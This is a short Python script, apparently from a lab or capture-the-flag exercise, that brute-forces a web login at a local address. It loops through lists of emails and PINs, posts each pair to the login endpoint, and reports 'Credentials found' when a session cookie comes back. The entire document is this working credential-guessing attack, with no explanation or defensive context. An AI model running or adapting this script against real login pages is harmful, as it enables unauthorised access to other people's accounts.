import requests
import sys
url = 'http://127.0.0.1:5006/login'
with open('/home/alienum/Desktop/users.txt') as users:
  for u in users:
    with open('/home/alienum/Desktop/pins.txt') as pins:
       for p in pins:
          user = {"email":u.strip(),"pin":p.strip()}
          r =  requests.post(url,data = user)
          if len(r.cookies) != 0:
             print('~~~~~~~~~~~~~~~~~~~')
             print('Credentials found!!')
             print('~~~~~~~~~~~~~~~~~~~')
             print('[+] Username : '+ u.strip())
             print('[+] Password : '+ p.strip())
             sys.exit()
